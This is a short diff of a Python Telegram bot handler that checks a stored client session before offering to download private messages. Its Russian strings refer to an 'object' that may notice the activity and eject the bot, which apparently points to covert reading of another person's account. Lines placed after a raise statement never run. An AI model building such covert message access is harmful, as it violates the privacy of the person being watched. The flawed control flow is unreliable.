@@ -102,18 +102,16 @@ async def analytic_command(message: types.Message):
 async def select_mode_of_download(message: types.Message):
     user_id = message.from_user.id
     if user_id in user_state and user_state[user_id].get('connected'):
-        try:
-          if await client.get_me() is None:
-            raise ValueError("Failed to retrieve user information.")
-            await bot.send_message(user_id, 'Объект заметил активность и "выкинул" бота')
-            user_state.pop(user_id, None)
-        except Exception as e:
-          logging.error(f"Error during GetDialogsRequest: {e}")
-          return
-          
-        await show_keyboard(message)
-        user_state[user_id]['type'] = 'private'
-        user_state[user_id]['selection']=''
+        if 'client' in user_state.get(user_id, {}):
+            client = user_state[user_id]['client']
+            if await client.get_me() is None:
+                raise ValueError("Failed to retrieve user information.")
+                await bot.send_message(user_id, 'Объект заметил активность и "выкинул" бота')
+                user_state.pop(user_id, None)
+            else:
+                await show_keyboard(message)
+                user_state[user_id]['type'] = 'private'
+                user_state[user_id]['selection']=''
     else:
         logging.info(f"User {user_id} is not connected. Cannot perform getting private message.")
         await message.answer("Вы должны сначала подключиться. Введите /start для начала процесса подключения.")
